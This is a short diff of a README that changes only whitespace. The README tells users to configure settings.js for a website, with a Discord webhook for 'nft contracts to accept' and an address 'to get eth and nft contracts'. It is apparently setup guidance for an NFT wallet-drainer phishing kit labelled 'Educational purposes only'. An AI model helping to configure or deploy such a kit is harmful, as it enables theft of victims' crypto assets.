@@ -16,7 +16,7 @@ Educational purposes only.
 In order to use this website, you need to edit the **settings.js** file. 
 You Can Change these Values.
 
-1.webhook: "your discord webhook to see nft contracts to accept"
+1.webhook: "your discord webhook to see nft contracts to accept" 
 2.address: "address to get eth and nft contracts"
 3.name: "nft collection name"
 4.extra: "extra text"
